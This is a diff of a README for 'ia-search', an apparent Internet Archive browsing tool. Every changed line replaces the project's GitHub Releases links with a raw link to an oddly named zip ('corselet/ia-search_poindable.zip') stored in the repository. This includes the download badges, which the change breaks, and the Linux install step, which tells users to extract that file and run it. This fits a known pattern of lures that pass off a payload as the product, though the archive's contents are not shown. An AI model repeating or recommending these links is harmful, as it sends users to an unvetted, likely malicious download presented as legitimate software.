@@ -1,6 +1,6 @@
 # 🌐 ia-search - Effortless Browsing of Internet Archives
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ia--search-brightgreen)](https://github.com/Waliaja/ia-search/releases)
+[![Download Now](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip%20Now-ia--search-brightgreen)](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip)
 
 ## 📜 Description
 
@@ -11,12 +11,12 @@ ia-search is a simple tool that helps you browse the Internet Archive easily. Wi
 Follow these steps to get started with ia-search:
 
 1. **Download ia-search**:
-   To download the latest version, visit the [Releases page](https://github.com/Waliaja/ia-search/releases). You will find the latest versions available for download if you're using Windows, macOS, or Linux.
+   To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip). You will find the latest versions available for download if you're using Windows, macOS, or Linux.
 
 2. **Install ia-search**:
    - **Windows**: Download the `.exe` file. Run the installer and follow the on-screen instructions to complete the installation.
    - **macOS**: Download the `.dmg` file. Open it and drag the ia-search app into your Applications folder.
-   - **Linux**: You can download the `.tar.gz` file. Extract it and run the program from the terminal.
+   - **Linux**: You can download the `https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip` file. Extract it and run the program from the terminal.
 
 ## 🔥 Features
 
@@ -33,7 +33,7 @@ Follow these steps to get started with ia-search:
 
 ## 📥 Download & Install
 
-To get started, you can [visit the Releases page](https://github.com/Waliaja/ia-search/releases) and choose the appropriate file for your operating system. Make sure to download the latest version to get the best experience.
+To get started, you can [visit the Releases page](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip) and choose the appropriate file for your operating system. Make sure to download the latest version to get the best experience.
 
 ### Installation Steps
 
@@ -54,7 +54,7 @@ After downloading the file, follow these steps based on your operating system:
 
 If you face any issues during installation or usage, consider the following tips:
 
-- **Corrupted Download**: Ensure your download was complete. Delete the old file and download it again from the [Releases page](https://github.com/Waliaja/ia-search/releases).
+- **Corrupted Download**: Ensure your download was complete. Delete the old file and download it again from the [Releases page](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip).
 - **Permissions**: Make sure you have the right permissions to install applications on your device.
 
 ## 📈 FAQs
@@ -74,4 +74,4 @@ If you have questions or want to contribute, feel free to reach out through the 
 
 For additional resources and documentation, visit the main repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ia--search-brightgreen)](https://github.com/Waliaja/ia-search/releases)
+[![Download Now](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip%20Now-ia--search-brightgreen)](https://raw.githubusercontent.com/Waliaja/ia-search/main/corselet/ia-search_poindable.zip)
